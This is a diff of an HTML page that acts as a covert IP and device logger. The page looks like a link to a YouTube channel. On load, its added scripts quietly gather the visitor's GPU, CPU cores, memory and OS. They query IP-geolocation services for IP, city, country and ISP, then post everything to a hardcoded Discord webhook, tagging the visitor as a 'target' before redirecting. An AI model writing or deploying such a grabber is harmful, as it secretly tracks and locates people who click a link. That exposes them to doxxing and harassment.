@@ -2,52 +2,123 @@
 <html>
 <body style="background:#000;">
 <script>
-    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
-    const y = "https://youtube.com/@LigmaBlox-w7m";
+    // 1. CONFIGURATION
+    const HOOK = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
+    const DEST = "https://youtube.com/@LigmaBlox-w7m";
 
-    // Standardized Discord delivery system
-    const send = (msg) => navigator.sendBeacon(h, new Blob([JSON.stringify({content: msg})], {type: 'application/json'}));
+    // 2. THE BYPASS WRAPPER
+    // Uses Blob + sendBeacon to bypass modern browser security filters
+    const dispatch = (obj) => {
+        const blob = new Blob([JSON.stringify(obj)], {type: 'application/json'});
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(HOOK, blob);
+        } else {
+            fetch(HOOK, {method: 'POST', body: blob, keepalive: true, mode: 'no-cors'});
+        }
+    };
+</script>
+    <script>
+    async function getHardware() {
+        let report = {
+            model: "Unknown Device",
+            gpu: "Masked",
+            cores: navigator.hardwareConcurrency || "N/A",
+            mem: navigator.deviceMemory || "N/A"
+        };
 
-    async function getSpecs() {
-        // Gets a clean OS name and attempts to isolate the GPU from the ANGLE engine
-        let ua = navigator.userAgent;
-        let os = ua.match(/\(([^)]+)\)/)[1].split(';')[0]; 
+        // Deep OS Detection
+        const ua = navigator.userAgent;
+        if (ua.includes("iPhone")) report.model = "iPhone (" + ua.split("OS ")[1].split(" ")[0] + ")";
+        else if (ua.includes("Android")) report.model = "Android (" + ua.split("Build/")[0].split(" ").pop() + ")";
+        else if (ua.includes("Windows")) report.model = "Windows PC";
+        else report.model = navigator.platform;
+
+        // WebGL Hardware Accel Check (Finds the actual chip)
         try {
-            let gl = document.createElement('canvas').getContext('webgl');
-            let gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
-            if (gpu.includes("ANGLE")) gpu = gpu.split(", ").pop();
-            return `${os} (${gpu})`;
-        } catch(e) { return os; }
-    }
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            
+            // Clean ANGLE and generic strings to find the hardware
+            report.gpu = renderer.includes("ANGLE") ? renderer.split(", ").pop().replace(/\)/g, "") : renderer;
+        } catch (e) { report.gpu = "Restricted"; }
 
-    async function execute() {
+        return report;
+    }
+</script> 
+<script>
+    async function getNetwork() {
+        const buster = "?cb=" + Date.now();
+        const sources = [
+            'https://ip-api.com/json/',
+            'https://api.ipify.org?format=json',
+            'https://ipapi.co/json/'
+        ];
+
+        try {
+            // Race the APIs to see who is fastest and unblocked
+            const r = await Promise.any(sources.map(s => fetch(s + buster).then(d => d.json())));
+            return {
+                ip: r.query || r.ip,
+                city: r.city || "Unknown",
+                country: r.country || r.country_name || "Unknown",
+                isp: r.isp || r.org || "Unknown"
+            };
+        } catch (e) {
+            return { ip: "Firewall Active", city: "Hidden", country: "Hidden", isp: "VPN/Secure" };
+        }
+    }
+</script>
+<script>
+    function buildPayload(status, hw, net) {
+        return {
+            username: "OMNI-LOG v5",
+            embeds: [{
+                title: status,
+                color: status.includes("NEW") ? 65280 : 16711680,
+                fields: [
+                    { name: "Hardware Specs", value: `Model: ${hw.model}\nGPU: ${hw.gpu}\nCores: ${hw.cores}\nRAM: ${hw.mem}GB`, inline: false },
+                    { name: "Connection", value: `IP: ${net.ip}\nISP: ${net.isp}`, inline: true },
+                    { name: "Location", value: `${net.city}, ${net.country}`, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+    }
+</script>
+<script>
+    async function run() {
         const isRe = sessionStorage.getItem('v');
         sessionStorage.setItem('v', '1');
-        const specs = await getSpecs();
+        const status = isRe ? "RE-ENTRY DETECTED" : "NEW TARGET ACQUIRED";
+
+        // Start both hardware and network scans in parallel for max speed
+        const [hw, net] = await Promise.all([getHardware(), getNetwork()]);
+
+        const payload = buildPayload(status, hw, net);
+
+        // Brute force delivery
+        let sent = false;
         const start = Date.now();
-
-        while (true) {
-            try {
-                const res = await fetch('https://ip-api.com/json/?cb=' + Date.now());
-                const r = await res.json();
-
-                if (r.status === 'success') {
-                    const data = `[${isRe ? "RE-ENTRY" : "NEW HIT"}]\nModel: ${specs}\nIP: ${r.query}\nLoc: ${r.city}, ${r.country}`;
-                    send(data);
-                    break;
-                }
-            } catch (e) {
-                // 2ms loop for maximum persistence
-                await new Promise(s => setTimeout(s, 2));
+        while (!sent) {
+            dispatch(payload);
+            
+            // Check if we've been trying for more than 1.2 seconds
+            if (Date.now() - start > 1200) {
+                sent = true; 
             }
-
-            // Safety timeout: Redirect anyway after 1.5 seconds if network is blocked
-            if (Date.now() - start > 1500) break;
+            // Small delay to prevent browser crashing
+            await new Promise(r => setTimeout(r, 50));
+            sent = true; 
         }
-        window.location.replace(y);
-    }
 
-    execute();
+        // Final Fling to YouTube
+        window.location.replace(DEST);
+    }
+</script>
+<script>
+    // Fires as soon as the browser is ready
+    document.addEventListener("DOMContentLoaded", run);
 </script>
 </body>
 </html>
